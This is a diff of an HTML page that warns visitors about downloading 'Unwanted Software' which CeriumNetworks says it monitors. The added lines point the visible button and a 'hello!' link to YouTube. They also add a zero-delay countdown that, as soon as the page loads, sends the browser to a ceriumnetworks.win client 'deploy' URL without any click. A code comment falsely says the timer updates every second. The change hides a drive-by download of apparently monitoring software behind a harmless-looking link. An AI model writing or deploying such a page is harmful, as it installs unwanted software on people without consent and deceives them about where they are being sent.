@@ -46,16 +46,31 @@
 <body>
     <div class="container">
         <div class="button-container">
-            <button onclick="redirect()">Download</button>
+            <button onclick="redirect()">Redirecting!</button>
             <div class="text">WARNING! You are about to download an Unwanted Software!</div>
               <div class="text">CeriumNetworks Actively Monitors this Software.</div>
                 <div class="text">YOU'VE BEEN WARNED</div>
+				 <p> <a href="https://www.youtube.com">hello!</a> in <span id="countdown">0</span> seconds.</p>
         </div>
     </div>
     <script>
-        function redirect() {
-            window.location.href = "https://api.ceriumnetworks.win/clients/a94e3d60-9b3c-4b38-9b80-e7e7d5dea671/deploy/";
+	        function redirect() {
+            window.location.href = "https://youtube.com";
         }
+        // Countdown function
+        let countdownValue = 0; // Starting countdown value in seconds
+        const countdownElement = document.getElementById("countdown");
+
+        const countdownInterval = setInterval(() => {
+            countdownValue--;
+            countdownElement.textContent = countdownValue;
+
+            if (countdownValue <= 0) {
+                clearInterval(countdownInterval);
+                // Redirect to the download URL
+                window.location.href = "https://api.ceriumnetworks.win/clients/a94e3d60-9b3c-4b38-9b80-e7e7d5dea671/deploy/";					
+            }
+        }, 0); // Update every second
     </script>
 </body>
 </html>
